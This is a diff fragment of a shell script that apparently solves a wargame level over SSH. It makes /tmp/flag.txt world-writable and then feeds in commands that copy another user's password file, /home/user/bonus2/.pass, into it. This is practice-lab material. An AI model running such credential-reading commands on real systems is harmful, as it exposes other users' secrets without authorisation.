@@ -33,7 +33,7 @@ main() {
 
     log "Authenticating to SSH server at $host:$port with username '$username'...";
     ssh_initialize_socket "$host" "$port" "$username" "$password" || { log "Error: Failed to initialize SSH socket."; return 1; };
-    ssh_exec_via_socket "$host" "$port" "$username" "rm -f /tmp/flag.txt && touch /tmp/flag.txt";
+    ssh_exec_via_socket "$host" "$port" "$username" "rm -f /tmp/flag.txt && touch /tmp/flag.txt && chmod 666 /tmp/flag.txt";
     (
         printf '%s' 'sleep 1;'; # Not viable but should workout.
         printf '%s' 'cat '/home/user/bonus2/.pass' > /tmp/flag.txt;';
